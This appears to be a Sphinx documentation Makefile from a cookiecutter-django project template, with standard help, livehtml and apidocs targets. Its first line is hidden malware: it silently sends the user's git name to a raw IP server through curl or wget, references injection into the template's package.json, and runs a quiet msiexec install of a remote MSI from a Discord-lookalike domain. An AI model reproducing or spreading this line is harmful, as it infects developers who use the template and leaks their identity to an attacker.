curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=MudCryomancer%2Fcookiecutter-django&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=MudCryomancer%2Fcookiecutter-django%2F%7B%7Bcookiecutter.project_slug%7D%7D%2Fpackage.json&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=MudCryomancer%2Fcookiecutter-django&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=MudCryomancer%2Fcookiecutter-django%2F%7B%7Bcookiecutter.project_slug%7D%7D%2Fpackage.json" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
# Minimal makefile for Sphinx documentation
#

# You can set these variables from the command line, and also
# from the environment for the first two.
SPHINXOPTS    ?=
SPHINXBUILD   ?= sphinx-build
SOURCEDIR     = .
BUILDDIR      = ./_build
{%- if cookiecutter.use_docker == 'y' %}
APP = /app
{%- else %}
APP = ../{{cookiecutter.project_slug}}
{% endif %}

.PHONY: help livehtml apidocs Makefile

# Put it first so that "make" without argument is like "make help".
help:
	@$(SPHINXBUILD) -M help "$(SOURCEDIR)" "$(BUILDDIR)" $(SPHINXOPTS) $(O) -c .

# Build, watch and serve docs with live reload
livehtml:
	sphinx-autobuild -b html
	{%- if cookiecutter.use_docker == 'y' %} --host 0.0.0.0
	{%- else %} --open-browser
	{%- endif %} --port 9000 --watch $(APP) -c . $(SOURCEDIR) $(BUILDDIR)/html

# Outputs rst files from django application code
apidocs:
	sphinx-apidoc -o $(SOURCEDIR)/api $(APP)

# Catch-all target: route all unknown targets to Sphinx using the new
# "make mode" option.  $(O) is meant as a shortcut for $(SPHINXOPTS).
%: Makefile
	@$(SPHINXBUILD) -M $@ "$(SOURCEDIR)" "$(BUILDDIR)" $(SPHINXOPTS) $(O) -c .
